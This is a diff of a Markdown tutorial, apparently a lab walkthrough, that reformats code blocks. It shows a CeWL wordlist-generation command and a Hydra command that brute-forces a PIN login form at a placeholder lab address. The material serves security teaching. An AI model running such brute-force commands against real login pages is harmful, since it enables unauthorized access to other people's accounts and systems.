@@ -21,13 +21,15 @@ Beyond simple wordlist generation, CeWL can also compile a list of email address
 
 To create and save a basic wordlist to a file, you can use the command below:
 
-```terminal
+```shell
 cewl http://MACHINE_IP -w output.txt
 ```
 
 ## Attacking with Hydra
 
-`hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`
+```shell
+hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+```
 
 The command above will try one password after another in the 3digits.txt file. It specifies the following:
 
